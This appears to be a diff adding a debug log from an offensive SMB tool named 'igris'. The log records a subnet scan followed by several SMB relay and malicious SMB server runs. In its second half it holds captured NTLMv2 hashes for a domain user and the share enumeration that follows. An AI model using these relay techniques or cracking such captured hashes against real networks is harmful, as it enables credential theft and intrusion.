+2021-10-19 10:26:48.338 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.54
+2021-10-19 10:26:48.361 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.55
+2021-10-19 10:26:48.363 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.56
+2021-10-19 10:26:49.303 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.51
+2021-10-19 10:26:49.306 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.52
+2021-10-19 10:26:49.307 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.53
+2021-10-19 10:26:49.341 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.54
+2021-10-19 10:26:49.364 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.55
+2021-10-19 10:26:49.366 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.56
+2021-10-19 10:26:50.305 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.57
+2021-10-19 10:26:50.309 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.58
+2021-10-19 10:26:50.311 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.59
+2021-10-19 10:26:50.344 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.60
+2021-10-19 10:26:50.366 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.61
+2021-10-19 10:26:50.368 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.62
+2021-10-19 10:26:51.307 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.57
+2021-10-19 10:26:51.314 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.58
+2021-10-19 10:26:51.316 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.59
+2021-10-19 10:26:51.346 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.60
+2021-10-19 10:26:51.369 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.61
+2021-10-19 10:26:51.371 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.62
+2021-10-19 10:26:52.310 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.63
+2021-10-19 10:26:52.318 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.64
+2021-10-19 10:26:52.320 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.65
+2021-10-19 10:26:52.349 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.66
+2021-10-19 10:26:52.372 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.67
+2021-10-19 10:26:52.374 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.68
+2021-10-19 10:26:53.312 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.63
+2021-10-19 10:26:53.320 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.64
+2021-10-19 10:26:53.322 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.65
+2021-10-19 10:26:53.351 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.66
+2021-10-19 10:26:53.375 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.67
+2021-10-19 10:26:53.377 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.68
+2021-10-19 10:26:54.316 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.69
+2021-10-19 10:26:54.325 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.70
+2021-10-19 10:26:54.326 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.71
+2021-10-19 10:26:54.354 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.72
+2021-10-19 10:26:54.378 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.73
+2021-10-19 10:26:54.380 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.74
+2021-10-19 10:26:55.317 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.69
+2021-10-19 10:26:55.329 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.70
+2021-10-19 10:26:55.330 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.71
+2021-10-19 10:26:55.356 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.72
+2021-10-19 10:26:55.381 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.73
+2021-10-19 10:26:55.382 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.74
+2021-10-19 10:26:56.320 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.75
+2021-10-19 10:26:56.332 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.76
+2021-10-19 10:26:56.333 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.77
+2021-10-19 10:26:56.358 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.78
+2021-10-19 10:26:56.382 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.79
+2021-10-19 10:26:56.384 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.80
+2021-10-19 10:26:57.321 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.75
+2021-10-19 10:26:57.335 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.77
+2021-10-19 10:26:57.336 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.76
+2021-10-19 10:26:57.360 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.78
+2021-10-19 10:26:57.385 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.79
+2021-10-19 10:26:57.387 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.80
+2021-10-19 10:26:58.327 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.81
+2021-10-19 10:26:58.341 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.82
+2021-10-19 10:26:58.346 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.83
+2021-10-19 10:26:58.363 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.84
+2021-10-19 10:26:58.388 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.85
+2021-10-19 10:26:58.390 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.86
+2021-10-19 10:26:59.330 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.81
+2021-10-19 10:26:59.342 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.82
+2021-10-19 10:26:59.348 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.83
+2021-10-19 10:26:59.365 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.84
+2021-10-19 10:26:59.390 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.85
+2021-10-19 10:26:59.392 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.86
+2021-10-19 10:26:59.393 | WARNING  | project.smb.scan:__set_up_scan_actions_synchronous:517 - 
+Exiting ...
+2021-10-19 10:26:59.394 | DEBUG    | project.smb.scan:__set_up_scan_actions_synchronous:518 - The scan was interrupted
+2021-10-19 10:26:59.413 | SUCCESS  | project.smb.scan:__set_up_scan_actions_synchronous:520 - Synchronous scanning has been completed
+2021-10-19 10:27:54.791 | DEBUG    | project.RelayAttacks.relayattacks:do_smb_relay:70 - Starting smb relay attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-19 10:27:54.792 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-19 10:28:00.484 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57805)
+2021-10-19 10:28:00.486 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57805)
+2021-10-19 10:28:00.498 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-19 10:28:00.499 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-19 10:28:00.500 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-19 10:28:00.501 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-19 10:28:00.502 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:1ab1aebc4aa86d52c95fee1d358098ec:0101000000000000007872fdd3c4d701438dd07d79ea6290000000000100100054004b0044006f005500760073006a000300100054004b0044006f005500760073006a0002001000470066006400740041006b004700640004001000470066006400740041006b004700640007000800007872fdd3c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a001000000000000000000000000000000000000900200063006900660073002f0070006f00630068006f002e006c006f00630061006c000000000000000000
+2021-10-19 10:28:00.504 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:1ab1aebc4aa86d52c95fee1d358098ec:0101000000000000007872fdd3c4d701438dd07d79ea6290000000000100100054004b0044006f005500760073006a000300100054004b0044006f005500760073006a0002001000470066006400740041006b004700640004001000470066006400740041006b004700640007000800007872fdd3c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a001000000000000000000000000000000000000900200063006900660073002f0070006f00630068006f002e006c006f00630061006c000000000000000000
+2021-10-19 10:28:00.529 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:28:00.529 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:28:00.777 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:28:00.777 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:28:15.050 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-19 10:28:15.051 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-19 10:28:15.058 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57805)
+2021-10-19 10:28:15.059 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57805)
+2021-10-19 10:28:15.060 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-19 10:28:15.060 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-19 10:30:22.409 | DEBUG    | project.RelayAttacks.relayattacks:do_smb_relay:70 - Starting smb relay attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-19 10:30:22.410 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-19 10:58:08.500 | DEBUG    | project.RelayAttacks.relayattacks:do_smb_relay:70 - Starting smb relay attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-19 10:58:08.501 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-19 10:58:45.687 | DEBUG    | project.RelayAttacks.relayattacks:do_smb_relay:70 - Starting smb relay attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-19 10:58:45.688 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-19 11:11:46.607 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_malicious_smb_server:70 - Starting smb relay attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-19 11:11:46.608 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-19 11:11:59.272 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57413)
+2021-10-19 11:11:59.274 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57413)
+2021-10-19 11:11:59.302 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-19 11:11:59.302 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-19 11:11:59.303 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-19 11:11:59.303 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-19 11:11:59.303 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:a49fcad298cee14f30630f1dc34bc451:010100000000000080e96922dac4d7019be6993a0e64c94f00000000010010004d0057004f004f004900730078007300030010004d0057004f004f004900730078007300020010005600440043006300460044004600410004001000560044004300630046004400460041000700080080e96922dac4d701060004000200000008003000300000000000000000000000002000000d9770a5318a3568501369de2cedd069cd8dc04c388af4150fd98c2fd99f447b0a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000
+2021-10-19 11:11:59.304 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:a49fcad298cee14f30630f1dc34bc451:010100000000000080e96922dac4d7019be6993a0e64c94f00000000010010004d0057004f004f004900730078007300030010004d0057004f004f004900730078007300020010005600440043006300460044004600410004001000560044004300630046004400460041000700080080e96922dac4d701060004000200000008003000300000000000000000000000002000000d9770a5318a3568501369de2cedd069cd8dc04c388af4150fd98c2fd99f447b0a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000
+2021-10-19 11:11:59.333 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-19 11:11:59.334 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-19 11:11:59.357 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-19 11:11:59.357 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-19 11:11:59.554 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 11:11:59.554 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 11:19:07.214 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:70 - Starting smb relay attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-19 11:19:07.215 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-19 11:19:15.178 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57431)
+2021-10-19 11:19:15.181 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57431)
+2021-10-19 11:19:29.264 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:70 - Starting smb relay attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-19 11:19:29.264 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-19 11:19:37.012 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57432)
+2021-10-19 11:19:37.015 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57432)
